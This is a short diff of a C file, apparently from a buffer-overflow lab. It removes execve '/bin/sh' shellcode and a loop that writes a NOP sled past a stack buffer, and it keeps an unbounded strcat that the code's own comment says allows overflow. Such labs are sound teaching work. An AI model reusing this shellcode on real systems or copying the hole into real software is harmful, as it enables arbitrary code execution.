@@ -13,31 +13,9 @@
 
 void greet(char *str)
 {
-    char shellcode[]=
-    "\x31\xc0" /* xorl %eax,%eax */
-    "\x50" /* pushl %eax */
-    "\x68""//sh" /* pushl $0x68732f2f */
-    "\x68""/bin" /* pushl $0x6e69622f */
-    "\x89\xe3" /* movl %esp,%ebx */
-    "\x50" /* pushl %eax */
-    "\x53" /* pushl %ebx */
-    "\x89\xe1" /* movl %esp,%ecx */
-    "\x99" /* cdql */
-    "\xb0\x0b" /* movb $0x0b,%al */
-    "\xcd\x80" /* int $0x80 */
-    ;
-    
     char greeting[32] = "Welcome ";
 
     /* The following allows buffer overflow */ 
-    for(int i =0;i<50;i++){
-        greeting[i] = 0x90;
-    }
-    for(int j = 0;j<11;j++){
-        greeting[j+50] = shellcode[j];
-    }
-
-
     strcat(greeting, str);
 
     return;
